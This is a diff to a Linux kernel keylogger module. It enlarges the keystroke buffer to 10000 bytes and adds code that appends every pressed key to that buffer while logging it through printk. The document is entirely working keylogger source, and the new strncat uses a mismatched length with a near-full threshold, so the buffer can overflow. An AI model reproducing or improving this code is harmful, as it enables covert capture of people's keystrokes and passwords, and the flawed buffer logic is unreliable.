@@ -60,7 +60,7 @@ static int is_open = 0;
 static int shiftKey = 0;
 struct semaphore sem;
 
-static char keybuf[300] = {};
+static char keybuf[10000] = {};
 static char *msg_ptr;
 
 static struct file_operations fops = {
@@ -127,7 +127,7 @@ int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
 		}
 
 		if(param->down) {
-	    	if(strlen(keybuf) > 200) {
+	    	if(strlen(keybuf) > 9999) {
 				printk(KERN_INFO "%s\n", keybuf); 
 				keybuf[0] = '\0';
 	    	}
@@ -139,6 +139,9 @@ int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
 			
 				printk(KERN_INFO "length: %d\n", (int)strlen(keybuf));
 	    	} else {
+				strncat(keybuf, keymap[param->value][1],
+					strlen(keymap[param->value][0]));
+
 				printk(KERN_INFO "%s \n", keymap[param->value][1]);
 	    	}
 	    	up(&sem);
